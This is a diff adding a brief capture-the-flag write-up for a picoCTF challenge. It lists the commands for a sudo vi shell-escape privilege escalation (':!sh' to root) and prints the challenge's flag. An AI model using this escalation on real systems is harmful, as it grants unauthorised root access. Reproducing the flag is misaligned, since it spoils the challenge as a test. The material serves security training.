@@ -1,0 +1,13 @@
+ssh -p 64960 picoplayer@saturn.picoctf.net
+Enter pw given
+sudo -l 
+Shows us we have permissions to /usr/bin/vi
+sudo vi
+:!sh (escalated to root)
+cd /root
+ls -la (Enumerates flag.txt file)
+cat .flag.txt
+
+Flag: picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
+
+Lessons learned: Using Vim and VIM priv escalation technique for root access.
